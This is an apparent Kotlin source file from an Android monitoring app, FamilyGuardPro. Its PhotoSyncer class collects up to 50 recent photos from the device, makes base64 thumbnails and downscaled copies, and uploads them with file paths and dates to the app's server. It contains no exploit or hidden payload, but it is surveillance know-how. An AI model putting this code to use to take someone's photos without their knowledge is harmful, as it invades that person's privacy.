package com.familyguardpro.utils

import android.content.Context
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import com.familyguardpro.network.ApiClient
import java.io.ByteArrayOutputStream
import java.io.File

/**
 * Utility class for syncing photos from the device to the server.
 * Collects recent photos, creates thumbnails, and uploads them.
 */
class PhotoSyncer(private val context: Context) {

    companion object {
        private const val TAG = "PhotoSyncer"
        private const val MAX_PHOTOS = 50
        private const val THUMBNAIL_SIZE = 200 // pixels
        private const val FULL_IMAGE_MAX_SIZE = 800 // pixels
        private const val BATCH_SIZE = 5 // Upload in batches
    }

    private val preferenceManager = PreferenceManager(context)

    /**
     * Syncs photos from the last [hours] hours to the server.
     * @return Number of photos successfully synced
     */
    suspend fun syncPhotos(hours: Int = 24): Int {
        val deviceId = preferenceManager.getDeviceId()
        if (deviceId.isEmpty()) {
            Log.w(TAG, "No device ID, cannot sync photos")
            return 0
        }

        val photos = getRecentPhotos(hours)
        Log.d(TAG, "Found ${photos.size} photos from last $hours hours")

        if (photos.isEmpty()) return 0

        var syncedCount = 0

        // Process in batches
        photos.chunked(BATCH_SIZE).forEach { batch ->
            val photoData = batch.mapNotNull { photoInfo ->
                try {
                    processPhoto(photoInfo)
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing photo: ${photoInfo.path}", e)
                    null
                }
            }

            if (photoData.isNotEmpty()) {
                try {
                    val response = ApiClient.api.uploadPhotos(
                        deviceId,
                        com.familyguardpro.network.PhotosRequestBody(
                            photos = photoData.map { photoMap ->
                                com.familyguardpro.network.PhotoItem(
                                    fileName = photoMap["fileName"] as? String ?: "",
                                    filePath = photoMap["filePath"] as? String ?: "",
                                    thumbnail = photoMap["thumbnail"] as? String,
                                    fullImage = photoMap["fullImage"] as? String ?: "",
                                    mimeType = photoMap["mimeType"] as? String ?: "image/jpeg",
                                    width = photoMap["width"] as? Int,
                                    height = photoMap["height"] as? Int,
                                    size = photoMap["size"] as? Long,
                                    dateTaken = (photoMap["dateTaken"] as? Long) ?: System.currentTimeMillis()
                                )
                            }
                        )
                    )
                    if (response.success) {
                        syncedCount += photoData.size
                        Log.d(TAG, "Uploaded batch of ${photoData.size} photos")
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error uploading photo batch", e)
                }
            }
        }

        return syncedCount
    }

    /**
     * Gets recent photos from the device.
     */
    private fun getRecentPhotos(hours: Int): List<PhotoInfo> {
        val photos = mutableListOf<PhotoInfo>()
        val cutoffTime = (System.currentTimeMillis() - (hours * 60 * 60 * 1000L)) / 1000

        val projection = arrayOf(
            MediaStore.Images.Media._ID,
            MediaStore.Images.Media.DATA,
            MediaStore.Images.Media.DISPLAY_NAME,
            MediaStore.Images.Media.DATE_ADDED,
            MediaStore.Images.Media.DATE_TAKEN,
            MediaStore.Images.Media.SIZE,
            MediaStore.Images.Media.WIDTH,
            MediaStore.Images.Media.HEIGHT,
            MediaStore.Images.Media.MIME_TYPE
        )

        val selection = "${MediaStore.Images.Media.DATE_ADDED} > ?"
        val selectionArgs = arrayOf(cutoffTime.toString())
        val sortOrder = "${MediaStore.Images.Media.DATE_ADDED} DESC"

        context.contentResolver.query(
            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
            projection,
            selection,
            selectionArgs,
            sortOrder
        )?.use { cursor ->
            val idColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media._ID)
            val pathColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA)
            val nameColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DISPLAY_NAME)
            val dateAddedColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATE_ADDED)
            val dateTakenColumn = cursor.getColumnIndex(MediaStore.Images.Media.DATE_TAKEN)
            val sizeColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.SIZE)
            val widthColumn = cursor.getColumnIndex(MediaStore.Images.Media.WIDTH)
            val heightColumn = cursor.getColumnIndex(MediaStore.Images.Media.HEIGHT)
            val mimeColumn = cursor.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)

            while (cursor.moveToNext() && photos.size < MAX_PHOTOS) {
                val id = cursor.getLong(idColumn)
                val path = cursor.getString(pathColumn)
                val name = cursor.getString(nameColumn)
                val dateAdded = cursor.getLong(dateAddedColumn) * 1000
                val dateTaken = if (dateTakenColumn >= 0) cursor.getLong(dateTakenColumn) else dateAdded
                val size = cursor.getLong(sizeColumn)
                val width = if (widthColumn >= 0) cursor.getInt(widthColumn) else 0
                val height = if (heightColumn >= 0) cursor.getInt(heightColumn) else 0
                val mimeType = if (mimeColumn >= 0) cursor.getString(mimeColumn) else "image/jpeg"

                if (File(path).exists()) {
                    photos.add(PhotoInfo(
                        id = id,
                        path = path,
                        fileName = name,
                        dateTaken = dateTaken,
                        size = size,
                        width = width,
                        height = height,
                        mimeType = mimeType ?: "image/jpeg"
                    ))
                }
            }
        }

        return photos
    }

    /**
     * Processes a single photo - creates thumbnail and compresses full image.
     */
    private fun processPhoto(photoInfo: PhotoInfo): Map<String, Any>? {
        val file = File(photoInfo.path)
        if (!file.exists()) return null

        // Decode with sample size to avoid OOM
        val options = BitmapFactory.Options().apply {
            inJustDecodeBounds = true
        }
        BitmapFactory.decodeFile(photoInfo.path, options)

        // Calculate sample size for thumbnail
        val thumbnailSampleSize = calculateSampleSize(
            options.outWidth, options.outHeight, THUMBNAIL_SIZE, THUMBNAIL_SIZE
        )

        // Decode thumbnail
        options.inJustDecodeBounds = false
        options.inSampleSize = thumbnailSampleSize
        val thumbnailBitmap = BitmapFactory.decodeFile(photoInfo.path, options)
            ?: return null

        val thumbnailBase64 = bitmapToBase64(thumbnailBitmap, 70)
        thumbnailBitmap.recycle()

        // Decode and compress full image (smaller size for upload)
        val fullSampleSize = calculateSampleSize(
            options.outWidth * thumbnailSampleSize,
            options.outHeight * thumbnailSampleSize,
            FULL_IMAGE_MAX_SIZE, FULL_IMAGE_MAX_SIZE
        )

        options.inSampleSize = fullSampleSize
        val fullBitmap = BitmapFactory.decodeFile(photoInfo.path, options)
        val fullImageBase64 = if (fullBitmap != null) {
            val b64 = bitmapToBase64(fullBitmap, 80)
            fullBitmap.recycle()
            b64
        } else {
            thumbnailBase64 // Fallback to thumbnail
        }

        return mapOf(
            "fileName" to photoInfo.fileName,
            "filePath" to photoInfo.path,
            "thumbnail" to thumbnailBase64,
            "fullImage" to fullImageBase64,
            "mimeType" to photoInfo.mimeType,
            "width" to photoInfo.width,
            "height" to photoInfo.height,
            "size" to photoInfo.size,
            "dateTaken" to photoInfo.dateTaken
        )
    }

    /**
     * Calculates appropriate sample size for image decoding.
     */
    private fun calculateSampleSize(
        width: Int, height: Int,
        targetWidth: Int, targetHeight: Int
    ): Int {
        var sampleSize = 1
        if (height > targetHeight || width > targetWidth) {
            val halfHeight = height / 2
            val halfWidth = width / 2

            while ((halfHeight / sampleSize) >= targetHeight &&
                   (halfWidth / sampleSize) >= targetWidth) {
                sampleSize *= 2
            }
        }
        return sampleSize
    }

    /**
     * Converts a bitmap to base64 string.
     */
    private fun bitmapToBase64(bitmap: Bitmap, quality: Int): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
        val bytes = outputStream.toByteArray()
        return Base64.encodeToString(bytes, Base64.NO_WRAP)
    }

    /**
     * Data class to hold photo information.
     */
    data class PhotoInfo(
        val id: Long,
        val path: String,
        val fileName: String,
        val dateTaken: Long,
        val size: Long,
        val width: Int,
        val height: Int,
        val mimeType: String
    )
}
